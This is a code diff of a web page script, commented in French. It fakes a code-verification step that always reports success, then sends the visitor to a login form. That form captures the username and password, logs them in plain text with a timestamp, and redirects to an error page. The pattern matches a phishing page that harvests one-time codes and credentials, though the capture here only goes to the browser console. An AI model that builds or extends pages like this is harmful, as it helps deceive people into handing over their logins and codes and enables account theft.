@@ -86,7 +86,7 @@ function setLanguage(lang) {
         document.getElementById('back-link').textContent = texts.backLink;
     }
     document.getElementById('support-text').innerHTML = texts.supportText;
-    document.getElementById('language-menu').style.display = 'none'; // Ferme le menu
+    document.getElementById('language-menu').style.display = 'none';
 }
 
 // Fonction pour afficher/cacher le menu
@@ -126,7 +126,7 @@ function resendCode() {
     }, 3000);
 }
 
-// Handle form submission with verification simulation (index.html uniquement)
+// Handle code form submission (index.html)
 if (document.getElementById('codeForm')) {
     document.getElementById('codeForm').addEventListener('submit', function(event) {
         event.preventDefault();
@@ -150,12 +150,32 @@ if (document.getElementById('codeForm')) {
         message.textContent = translations.index[currentLang].verifying;
         button.disabled = true;
 
+        // Simuler sauvegarde dans la console
+        console.log(`[${new Date().toISOString()}] Code saisi : ${code}`);
+
         setTimeout(() => {
             message.style.color = '#00cc00';
             message.textContent = translations.index[currentLang].verified;
             setTimeout(() => {
-                document.getElementById('codeForm').submit();
+                window.location.href = 'login.html';
             }, 1000);
         }, 2000);
+    });
+}
+
+// Handle login form submission (login.html)
+if (document.getElementById('loginForm')) {
+    document.getElementById('loginForm').addEventListener('submit', function(event) {
+        event.preventDefault();
+
+        const username = document.getElementById('username-placeholder').value;
+        const password = document.getElementById('password-placeholder').value;
+
+        // Simuler sauvegarde dans la console
+        console.log(`[${new Date().toISOString()}] Utilisateur : ${username} | Mot de passe : ${password}`);
+
+        setTimeout(() => {
+            window.location.href = 'error.html';
+        }, 1000);
     });
 }
